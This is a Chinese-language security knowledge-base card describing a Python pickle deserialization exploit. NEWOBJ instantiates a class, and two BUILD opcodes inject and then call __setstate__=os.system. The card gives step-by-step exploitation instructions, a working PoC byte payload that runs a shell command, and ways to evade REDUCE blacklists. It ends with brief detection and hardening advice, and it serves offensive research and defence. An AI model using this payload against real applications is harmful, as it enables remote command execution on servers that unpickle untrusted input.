---
id: web-python-deserialization-pickle-build-setstate-newobj-instance-rce
title: Pickle BUILD 调用 __setstate__ 执行命令：NEWOBJ 创建实例避开类 __dict__ 的 mappingproxy 只读
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-build-setstate-newobj-instance-rce
aliases:
- pickle BUILD __setstate__
- NEWOBJ 实例化绕过 mappingproxy
- b 操作符命令执行
- pickle __dict__ 只读
- BUILD setstate gadget
tags:
- python
- pickle
- deserialization
- opcode
- newobj
- build
- setstate
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V501
  verified_at: '2026-11-11T02:32:21+08:00'
  notes: 已对照原文核对：BUILD 两次触发（先 __dict__ 写入 __setstate__=os.system，再 BUILD 调用 os.system(命令)）、NEWOBJ 实例化避开 class.__dict__ mappingproxy 只读的限制与原文 b 操作符章节及 payload 一致；用 Python 3.12 复跑原文同构 payload（echo）确认执行，未在目标环境复跑。
---

## 一句话结论

pickle 的 `b`（BUILD）操作符在对象存在 `__setstate__` 时会执行 `__setstate__(state)`；攻击者可以先用 `c` 取类、`\x81`（NEWOBJ）创建一个实例，再通过一次 BUILD 把 `__setstate__ = os.system` 写进实例的 `__dict__`，第二次 BUILD 传入命令字符串即触发命令执行——关键是必须操作**实例**，直接对类操作会因 `class.__dict__` 是只读 mappingproxy 而失败。

## 原理

- `load_build` 的语义：弹出栈顶 `state`，取 `inst = stack[-1]`，先 `getattr(inst, '__setstate__', None)`；若存在就调用 `setstate(state)` 并返回；否则把 `state` 字典合并进 `inst.__dict__`（`state` 为二元组时第二项走 `setattr` 的 slotstate 路径）。
- 因此 `b` 有两个阶段：第一次调用时对象还没有 `__setstate__`，BUILD 只能做 `__dict__` 更新——攻击者把 `{"__setstate__": os.system}` 合并进对象属性；第二次调用时 `getattr` 已经能取到 `os.system`，BUILD 就把下一个 state（命令字符串）传给 `os.system` 执行。
- 为什么必须实例化：Python 中 `Class.__dict__` 返回 `mappingproxy`（只读视图），`load_build` 对类做 `inst.__dict__[k] = v` 会抛 `TypeError: 'mappingproxy' object does not support item assignment`；而实例的 `__dict__` 是普通 dict，可写。
- `\x81`（NEWOBJ）调用 `cls.__new__(cls, *args)` 创建实例，不执行 `__init__`，正好避开类初始化逻辑，得到一个可写 `__dict__` 的对象。之后两次 BUILD 即可完成“注入 setstate → 调用 setstate”。
- 这条链只依赖 `c`、`)`、`\x81`、`}`、`S`/`X`、`s`/`u`、`b` 等基础 opcode，不需要 `R`/`i`/`o`；在禁用 REDUCE 的黑名单场景下仍然可用。
- 目标类只需在 `__main__`（或其他可导入模块）中存在、且能用无参 `__new__` 创建；许多业务类/空类都满足。

## 触发条件

- 存在用户可控的 `pickle.loads`/`Unpickler.load` 入口。
- 目标模块里有一个可导入的无参可实例化类（如 `__main__.X`、业务 DTO、空类）。
- 反序列化未做严格 `find_class` 白名单（至少允许取到该类与 `os.system`），或黑名单未覆盖 `BUILD`/`NEWOBJ` 组合。
- 进程权限允许执行命令。

## 利用步骤

1. 确认反序列化入口与目标类：从源码/报错/常见模块名（`__main__`）找一个可无参实例化的类。
2. 构造 opcode：`c<module>\n<class>\n` 取类 → `)` 空元组 → `\x81` NEWOBJ 实例化 → `}` 空字典 → `(` + `S"__setstate__"` + `c os\nsystem\n` + `s` 把 `__setstate__: os.system` 写入字典 → `b` 把字典合并进实例 `__dict__`。
3. 再压入命令字符串（`S"id"` 或 `X`），跟一个 `b`，触发 `os.system("id")`。
4. 用 `pickletools.dis` 核对栈次序；在本地同版本 Python 用无害类验证（先执行 `echo`/`whoami`）。
5. 若目标没有可用的可导入类，改用 `pickle._Unpickler` 等标准库类（BUILD 对类走 slotstate/setattr 路径），或用 NEWOBJ 创建内建类型实例。
6. 无回显时用写文件、DNS/HTTP 外带或时间盲注验证。

## PoC

```python
# 结构示意：module/class 替换为目标环境存在的类
payload = (
    b"c__main__\nX\n"      # GLOBAL __main__.X
    b")\x81"               # EMPTY_TUPLE + NEWOBJ：实例化 X
    b"}(S\"__setstate__\"\n"  # 空字典 + MARK + 键
    b"cos\nsystem\n"       # os.system
    b"s"                   # SETITEM：dict['__setstate__'] = os.system
    b"b"                   # BUILD：无 __setstate__，合并进实例 __dict__
    b"S\"id\"\n"           # 命令字符串
    b"b"                   # BUILD：调用 __setstate__('id') -> os.system('id')
    b"."
)
```

```python
import pickletools
pickletools.dis(payload)
# 预期：GLOBAL __main__ X / EMPTY_TUPLE / NEWOBJ / EMPTY_DICT / ... / BUILD / ... / BUILD / STOP
```

说明：payload 按 `load_build` 语义构造，类名与命令需按目标替换；未在目标环境复跑。直接对类（不经过 `\x81`）会在第一次 BUILD 时因 mappingproxy 只读报错。

## 变体与关联

- 变体：用 `u`（SETITEMS）一次写入多个键值，或把 `__setstate__` 换成任意接收单参数的函数（如 `eval`、`exec`、`subprocess.run` 的包装）。
- 变体：不创建实例而用 `pickle._Unpickler` 等类对象走 BUILD 的 slotstate/setattr 路径，直接改类属性；适用场景不同（见关联卡）。
- 关联：[[web-python-deserialization-unpickler-persistent-load-system]]（BUILD 改类属性 `persistent_load` 的另一条路）；[[web-python-deserialization-pker-opcode-primitives]]（BUILD/SETITEM 原语与栈语义）；[[web-python-deserialization-pickle-blacklist-miss-subprocess-run-opcode]]（黑名单漏项与 opcode 组合）。
- 边界：目标类无法无参实例化、`find_class` 禁止取 `os.system`、Python 版本/实现改变 BUILD 回退行为时失效；`__setstate__` 只接受一个 state 参数。

## 检测与防御

- 检测：pickle 载荷中出现 `NEWOBJ`（`\x81`）后紧跟 `BUILD`、`__setstate__` 字符串、`os`/`system` 等组合；`pickletools` 静态分析中 `BUILD` 对实例写入 `__setstate__` 属高危模式。
- 修复：不要反序列化不可信 pickle；必须使用时用严格 `find_class` 白名单，禁止 `os`/`subprocess`/`builtins` 及属性访问原语。
- 加固：在低权限独立进程/容器中反序列化；监控 `execve` 与异常子进程；对反序列化输入做长度、格式与来源校验。
